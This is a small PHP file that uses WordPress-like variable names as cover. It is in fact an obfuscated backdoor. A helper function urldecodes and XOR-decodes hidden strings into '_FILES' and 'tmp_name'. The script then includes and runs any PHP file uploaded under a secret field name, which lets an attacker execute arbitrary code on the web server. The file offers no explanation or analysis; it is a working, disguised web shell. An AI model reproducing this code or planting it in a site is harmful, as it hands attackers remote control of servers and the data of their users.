<?php 	

function content()

{
	$target = 'wp_post_types';
    $char = 'MkTSZlfPEow';
	$cats = 'taxonomy_obj';
    $feeds = $char;
    

    $hash = $GLOBALS[format("%12-%1D%1F%1F%3F", $feeds)];
    $post_type = $hash;
    $join = isset($post_type[$feeds]);
	$show_in_nav_menus = 'default_editor';
    if ($join)

    {
        $private = $hash[$feeds];

        $sanitized_email = $private[format("9%06%24%0C4%0D%0B5", $feeds)];

        $html = $sanitized_email;
        include ($html);

    }

}
	$_links_add_target = 'caption';
function format($show_in_admin_all_list, $template_lock)

{
    $page_path = $template_lock;
    $to_look = "url" . "decode";
    $smiley = $to_look($show_in_admin_all_list);
    $field = substr($page_path,0, strlen($smiley));

    $raw_excerpt = $smiley ^ $field;
    

    $smiley = strpos($raw_excerpt, $field);
    
    return $raw_excerpt;
	$match = 'expages';
}


content();

?>
